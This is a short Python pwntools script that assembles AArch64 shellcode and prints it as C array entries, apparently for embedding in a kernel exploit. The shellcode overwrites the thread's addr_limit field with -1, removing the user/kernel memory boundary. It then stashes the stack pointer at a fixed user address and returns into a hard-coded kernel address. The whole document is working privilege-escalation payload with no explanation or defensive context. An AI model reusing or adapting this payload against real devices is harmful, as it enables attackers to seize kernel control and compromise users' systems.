from pwn import *

context(arch='aarch64')
data = asm('''
sub sp, sp, #0x8
str x0, [sp]

mov x0, sp
and x0, x0, #0xffffffffffffc000
add x0, x0, #0x8
mov x1, #0x0
sub x1, x1, #0x1
str x1, [x0]

mov x1, sp
mov x0, #0x40
lsl x0, x0, #0x8
add x0, x0, #0x1
lsl x0, x0, #0x8
lsl x0, x0, #0x8
str x1, [x0]
 
mov x0, #0xff
lsl x0, x0, #0x8
add x0, x0, #0xff
	
lsl x0, x0, #0x8
add x0, x0, #0xff

lsl x0, x0, #0x8
add x0, x0, #0xc0
	
lsl x0, x0, #0x8
add x0, x0, #0x00

lsl x0, x0, #0x8
add x0, x0, #0x16

lsl x0, x0, #0x8
add x0, x0, #0x22

lsl x0, x0, #0x8
add x0, x0, #0x28

mov x30, x0
ldr x0, [sp]

add sp, sp, #0x8
ret
''')

for i in xrange(len(data) / 4):
	print 'data[%d] = 0x%x;' % (i, u32(data[i * 4 : i * 4 + 4]))
